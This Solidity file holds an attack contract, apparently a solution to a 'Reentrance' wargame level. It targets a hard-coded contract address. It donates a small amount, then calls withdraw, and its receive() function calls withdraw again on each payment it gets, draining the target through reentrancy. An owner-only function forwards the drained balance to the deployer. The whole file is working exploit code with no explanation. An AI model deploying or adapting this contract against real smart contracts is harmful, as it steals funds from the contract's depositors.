// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint256 _amount) external;
}

contract ReentranceHelper {
    address public reentranceAddr;
    address private owner;
    constructor() payable {
        reentranceAddr = 0xea4cb64900C5Bbacad317CCD81896C7795F119c6;
        owner = msg.sender;
//        address payable ReentAddress = payable (reentranceAddr);
//        IReentrance(ReentAddress).donate{value: 0.001 ether}(address(this));
    }

    modifier ownerMod {
        require(owner == msg.sender, "Should be owner");
        _;
    }

    function donate() public payable {
        address payable ReentAddress = payable (reentranceAddr);
        IReentrance(ReentAddress).donate{value: 0.001 ether}(address(this));
    }

    function withdraw() public payable {
        address payable ReentAddress = payable (reentranceAddr);
        uint256 valueInWei = 0.001 ether;
        IReentrance(ReentAddress).withdraw(valueInWei);
    }

    function withdrawAll() public ownerMod {
        require(owner == msg.sender, "Should be owner");
        uint256 balance = address(this).balance;
        require(balance > 0, "No balance");

        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
    }

    receive() external payable { 
        address payable ReentAddress = payable (reentranceAddr);
        uint256 valueInWei = 0.001 ether;

        IReentrance(ReentAddress).withdraw(valueInWei);
    }
    fallback() external payable { 
    }
}
